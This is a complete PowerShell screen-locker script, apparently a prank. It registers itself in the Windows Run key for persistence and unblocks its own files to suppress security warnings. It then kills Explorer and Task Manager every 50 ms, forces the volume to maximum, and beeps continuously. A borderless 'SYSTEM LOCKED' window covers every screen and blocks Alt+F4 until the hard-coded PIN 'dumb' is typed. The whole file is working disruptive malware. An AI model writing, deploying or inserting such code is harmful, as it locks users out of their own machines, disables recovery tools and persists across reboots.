# Self-elevate to ensure we can kill Explorer
# (Disabled to prevent UAC prompt at startup)
# if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
#     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
#     Exit
# }

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Set as Startup App
$batchPath = Join-Path $PSScriptRoot "rnd.bat"
if (Test-Path $batchPath) {
    # Unblock files to prevent security warnings
    Unblock-File -Path $batchPath -ErrorAction SilentlyContinue
    Unblock-File -Path $PSCommandPath -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BigScrollLock" -Value $batchPath
}

$PIN = 'dumb'

# Max Volume
$wsh = New-Object -ComObject WScript.Shell
1..50 | ForEach-Object { $wsh.SendKeys([char]175) }

# Initial kill
Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 200

$form = New-Object Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Normal' 
$form.TopMost = $true
$form.KeyPreview = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.DoubleBuffered = $true

# Cover all screens
$bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
$totalBounds = $bounds[0]
for ($i = 1; $i -lt $bounds.Count; $i++) {
    $totalBounds = [System.Drawing.Rectangle]::Union($totalBounds, $bounds[$i])
}
$form.Bounds = $totalBounds

# Ensure window gets focus
$form.Add_Shown({ 
    $form.Activate()
    $form.Focus() 
})

# Start continuous beep in background
$script:beepRunspace = [powershell]::Create()
$null = $script:beepRunspace.AddScript({
    while ($true) {
        [System.Console]::Beep(2000, 500)
    }
})
$script:beepHandle = $script:beepRunspace.BeginInvoke()

$script:typedPIN = ''

# Timer for Security Only (No Animation/Redraw)
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 50
$timer.Add_Tick({ 
    # Security Enforcement
    $form.TopMost = $true
    $form.Activate()
    $form.Focus()
    
    # Aggressively keep Explorer dead so shortcuts don't work
    $ex = Get-Process -Name explorer -ErrorAction SilentlyContinue
    if ($ex) { Stop-Process -InputObject $ex -Force -ErrorAction SilentlyContinue }

    # Check if Task Manager is open and close it
    $tm = Get-Process -Name Taskmgr -ErrorAction SilentlyContinue
    if ($tm) { Stop-Process -InputObject $tm -Force -ErrorAction SilentlyContinue }
})
$timer.Start()

$form.Add_Paint({
    $g = $_.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $w = $form.ClientSize.Width
    $h = $form.ClientSize.Height
    
    # 1. Static Purple Background
    $bgColor1 = [System.Drawing.Color]::Purple
    $bgColor2 = [System.Drawing.Color]::Black
    
    $rect = New-Object System.Drawing.Rectangle(0, 0, $w, $h)
    $brushBg = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $bgColor1, $bgColor2, 45.0)
    $g.FillRectangle($brushBg, $rect)
    $brushBg.Dispose()
    
    # 2. Draw "SYSTEM LOCKED" Header
    $fontHeader = New-Object System.Drawing.Font('Consolas', 48, [System.Drawing.FontStyle]::Bold)
    $textHeader = "SYSTEM LOCKED"
    $sizeHeader = $g.MeasureString($textHeader, $fontHeader)
    $xH = ($w - $sizeHeader.Width) / 2
    $yH = ($h / 2) - 120
    
    # Shadow effect
    $g.DrawString($textHeader, $fontHeader, [System.Drawing.Brushes]::DarkRed, $xH+4, $yH+4)
    $g.DrawString($textHeader, $fontHeader, [System.Drawing.Brushes]::Red, $xH, $yH)
    
    # 3. Draw PIN Input
    $pinDisplay = ""
    if ($script:typedPIN.Length -gt 0) {
        $pinDisplay = "█ " * $script:typedPIN.Length
    } else {
        $pinDisplay = "_ _ _ _"
    }
    
    $fontPin = New-Object System.Drawing.Font('Consolas', 36)
    $sizePin = $g.MeasureString($pinDisplay, $fontPin)
    $xP = ($w - $sizePin.Width) / 2
    $yP = ($h / 2) + 20
    
    $g.DrawString($pinDisplay, $fontPin, [System.Drawing.Brushes]::Cyan, $xP, $yP)
    
    # 4. Footer
    $fontFooter = New-Object System.Drawing.Font('Arial', 12)
    $textFooter = "SECURE TERMINAL // ACCESS RESTRICTED"
    $sizeFooter = $g.MeasureString($textFooter, $fontFooter)
    $g.DrawString($textFooter, $fontFooter, [System.Drawing.Brushes]::Gray, ($w - $sizeFooter.Width)/2, $h - 50)
    
    $fontHeader.Dispose()
    $fontPin.Dispose()
    $fontFooter.Dispose()
})

$form.Add_KeyDown({
    # Block Alt+F4
    if ($_.Alt -and $_.KeyCode -eq 'F4') { $_.Handled = $true }
    
    if ($_.KeyCode -eq 'Back' -and $script:typedPIN.Length -gt 0) {
        $script:typedPIN = $script:typedPIN.Substring(0, $script:typedPIN.Length - 1)
    }
    elseif ($_.KeyCode -eq 'Enter') {
        if ($script:typedPIN -eq $PIN) { 
            $timer.Stop()
            $script:beepRunspace.Stop()
            $script:beepRunspace.Dispose()
            Start-Process explorer
            $form.Close() 
        }
        else { 
            $script:typedPIN = '' 
            [System.Console]::Beep(500, 200) # Error beep
        }
    }
    elseif ($_.KeyCode -eq 'Escape') {
        $script:typedPIN = ''
    }
    elseif ($_.KeyCode -match '^D\d$') {
        $script:typedPIN += $_.KeyCode.ToString().Substring(1)
    }
    elseif ($_.KeyCode -match '^NumPad\d$') {
        $script:typedPIN += $_.KeyCode.ToString().Replace('NumPad','')
    }
    # Add support for letters so you can type "dumb"
    elseif ($_.KeyCode.ToString().Length -eq 1 -and $_.KeyCode.ToString() -match '[A-Z]') {
        $script:typedPIN += $_.KeyCode.ToString().ToLower()
    }
    $form.Invalidate()
})

[Windows.Forms.Application]::Run($form)
